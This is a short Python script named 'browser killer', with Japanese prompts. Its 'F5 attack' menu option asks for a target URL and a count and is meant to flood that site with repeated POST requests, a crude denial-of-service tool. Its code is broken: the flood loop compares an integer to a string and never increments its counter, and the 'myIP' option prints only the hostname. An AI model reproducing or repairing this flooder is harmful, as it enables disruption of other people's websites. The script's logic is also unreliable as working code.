import winsound
import socket
import requests
import platform

#ようこそ画面
print("browser killer")
a = input("コマンドを入力してください")

#コマンドに応じた処理
if a == "help":
    print("F5 : F5アタック設定コンソールを実行します")
    print("myIP : 自機のホスト名とIPアドレスを取得します")
    print("OSinfo : 自機の情報を取得します。")
    print("end : このプログラムを終了します。")

elif a == "F5":
    print("F5アタック設定コンソールが起動しました。")
    se = input("ターゲットURLを入力してください。:")
    ce = input("回数を入力してください。")
    i = 0
    while(i == ce):
        requests.post(se)
        
elif a == "myIP":
    host = socket.gethostname()
    print(host)
    
elif a == "OSinfo":

    print(platform.platform())

elif a == "end":
    exit() #プログラムを終了する


